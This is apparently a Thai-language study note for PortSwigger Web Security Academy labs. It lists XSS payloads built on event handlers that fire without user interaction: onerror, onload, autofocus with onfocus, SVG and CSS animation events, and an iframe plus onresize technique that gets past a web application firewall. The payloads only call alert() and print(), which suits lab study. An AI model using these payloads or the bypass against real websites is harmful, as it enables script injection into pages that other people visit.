# ⚡ 2. Event Triggers (Load / Focus / Animation)

> รวม **event handler** ที่ใช้ trigger XSS **โดยไม่ต้องมี user interaction** (หรือมีน้อยที่สุด)

---

## 📦 Load-based

Event ที่ fire เมื่อ resource โหลด (สำเร็จหรือล้มเหลว)

```html
<!-- โหลดรูปล้มเหลว → onerror ทำงาน -->
<img src=x onerror=alert(1)>

<!-- iframe โหลดเสร็จ -->
<iframe src="javascript:alert(1)">

<!-- body โหลดเสร็จ -->
<body onload=alert(1)>

<!-- svg โหลดเสร็จ -->
<svg onload=alert(1)>

<!-- object โหลดล้มเหลว -->
<object data=x onerror=alert(1)>

<!-- video/audio source error -->
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

> 💡 `<img src=x onerror=alert(1)>` เป็น payload ยอดนิยม **เพราะ:**
> - ใช้กับ `innerHTML` ได้
> - `src=x` โหลดล้มเหลวแน่นอน
> - Fire อัตโนมัติ ไม่ต้องรอ user

---

## 🎯 Focus-based

Event ที่ fire เมื่อ element ได้/เสีย focus

```html
<!-- autofocus = ไม่ต้องรอ user คลิก -->
<input autofocus onfocus=alert(1)>

<!-- เสีย focus -->
<input onblur=alert(1) autofocus>

<!-- select -->
<select onfocus=alert(1) autofocus>

<!-- textarea -->
<textarea onfocus=alert(1) autofocus>
```

> 💡 **`autofocus` คือ key!** — ทำให้ focus ทันทีที่โหลด → ไม่ต้องรอ user คลิก

---

## 🎬 Animation-based (ดีสำหรับ bypass)

Event ที่ fire เมื่อมี animation เริ่ม — **WAF มักตรวจไม่ถึง**

### SVG Animate
```html
<svg>
  <animate onbegin=alert(1) attributeName=x dur=1s>
</svg>
```

### CSS Animation
```html
<style>
  @keyframes x { from {} to {} }
  #x { animation: x 1s; }
</style>
<div id=x onanimationstart=alert(1)></div>
```

### SVG AnimateTransform
```html
<svg>
  <animateTransform onbegin=alert(1) attributeName=transform>
</svg>
```

---

## 🔥 WAF Bypass: onresize + iframe Technique

### สถานการณ์
WAF block `<img>`, `<svg>`, `onerror`, `onload` แต่ไม่ block `<body>` และ `onresize`

### Payload (วางใน exploit server)
```html
<iframe src="https://LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

### อธิบาย (สำหรับเด็ก 5 ขวบ 🍼)

1. **สร้างกรอบรูป (iframe)** ที่โหลดหน้าเว็บ lab พร้อมแอบซ่อนกับดัก `<body onresize=print()>` เข้าไป

2. **พอโหลดเสร็จ** กรอบรูปเปลี่ยนขนาดตัวเอง (`width='100px'`) ทำให้หน้าเว็บข้างในถูกบีบ

3. **หน้าเว็บถูกบีบ = resize** → กับดัก `onresize` ทำงาน → `print()` ถูกเรียกเอง โดยไม่ต้องให้ใครทำอะไร

### Flow ภาพรวม
```
Victim เปิด exploit server URL
        ↓
exploit server ส่ง iframe กลับมา
        ↓
iframe โหลดหน้า lab พร้อม payload ใน search
        ↓
lab reflect <body onresize=print()> เข้า HTML
        ↓
iframe โหลดเสร็จ → onload fire → width เปลี่ยน
        ↓
onresize fire → print() ทำงาน
```

### ⚠️ ข้อควรระวัง
- URL ใน `src` ต้องชี้ไปที่ **lab** (ไม่ใช่ exploit server)
- Payload ใน `?search=` ต้อง **URL encode** (`"` = `%22`, `<` = `%3C`, `>` = `%3E`)

---

## 🔗 ดูเพิ่ม
- [[01-DOM-XSS|DOM XSS Labs]]
- [[../Concepts/Source-Sink|Source → Sink]]

#xss #event-handlers #waf-bypass #onresize
